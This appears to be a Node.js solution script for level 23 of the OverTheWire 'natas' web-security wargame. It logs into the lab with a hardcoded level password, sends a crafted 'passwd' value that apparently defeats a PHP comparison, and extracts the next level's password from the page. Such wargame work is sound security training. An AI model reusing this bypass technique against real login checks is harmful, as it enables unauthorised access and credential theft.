const http = require('http');
const querystring = require('querystring');

const options = {
  base: () => ({
    auth: 'natas23:D0vlad33nQF0Hz2EP255TP5wSW9ZsRSE',
    headers: {
      'Content-Type': 'application/x-www-form-urlencoded',
      Cookie: `PHPSESSID=nickontheweb`,
    },
    hostname: 'natas23.natas.labs.overthewire.org',
    port: 80,
  }),
  get: passwd => ({
    ...options.base(),
    method: 'GET',
    path: `/index.php?passwd=${passwd}`,
  }),
};

const get = (opts = options.get()) =>
  new Promise((resolve, reject) =>
    http
      .request(opts, res => {
        let body = '';
        res.on('data', data => (body = body + data));
        res.on('end', () => resolve(body));
      })
      .on('error', reject)
      .end(),
  );

get(options.get('11iloveyou')).then(body => {
  const wasAuthed = body.match(/Password/);

  wasAuthed ? console.log('Success!') : console.log('Failure!');
  if (!wasAuthed) return;

  const regex = /(Password: [a-zA-Z0-9]{32})<\/pre>/;
  const password = body.match(regex)[1];

  console.log(password);
});
